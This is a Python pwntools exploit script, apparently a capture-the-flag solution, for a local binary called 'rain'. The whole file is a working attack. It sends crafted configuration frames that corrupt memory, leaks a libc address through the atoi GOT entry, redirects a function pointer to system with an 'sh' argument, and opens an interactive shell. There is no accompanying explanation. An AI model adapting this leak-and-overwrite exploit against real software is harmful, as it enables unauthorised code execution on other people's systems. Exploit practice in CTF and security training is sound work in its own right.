#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

# remote_service = ""
# remote_service = remote_service.strip().split(" ")
# p = remote(remote_service[0], int(remote_service[1]))
filename = "./rain"
p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))

cmd = lambda cho : p.sendlineafter(b'ch> ', str(cho).encode())
def debugPID():
    lg("p.pid")
    input()

def config(frame):
    cmd(1)
    ru(b'FRAME> ')
    sn(frame.ljust(18, b"\x00"))

config(p32(0x20) + p32(0x20) + p8(2) + p8(1) + p32(100) + p32(40000) + b"a"*0x40)
config(p32(0x20) + p32(0x20) + p8(2) + p8(1) + p32(0) + p32(40000))
config(p32(0x20) + p32(0x20) + p8(2) + p8(1) + p32(0) + p32(40000))
# debugPID()
cmd(3)
frame = p32(0x20) + p32(0x20) + p8(2) + p8(1) + p32(1) + p32(40000)
frame+= p32(0)+p32(0x40)+p8(2)+p8(1)+b'P'*0x6+p64(0)+p64(0)+p32(1)+p32(40000)+p64(0x400E17)+p64(e.got['atoi'])+p64(0xdeadbeef)
# debugPID()
config(frame)
# debugPID()
cmd(2)
ru(b"Table:")
libc_base = u64(ru(b"\n", "drop").replace(b" ", b"").ljust(8, b"\x00")) - l.symbols['atoi']
lg("libc_base")

config(p32(0x20) + p32(0x20) + p8(2) + p8(1) + p32(1) + p32(40000))
frame = p32(0x20) + p32(0x20) + p8(2) + p8(1) + p32(1) + p32(40000)
# debugPID()
frame+= b'sh\x00\x00' + p32(0x20)+p8(2)+p8(1)+b'P'*0x6+p64(0)+p64(0)+p32(1)+p32(40000)+p64(libc_base+l.symbols['system'])+p64(0xdeadbeef)*2
config(frame)
cmd(2)

irt()
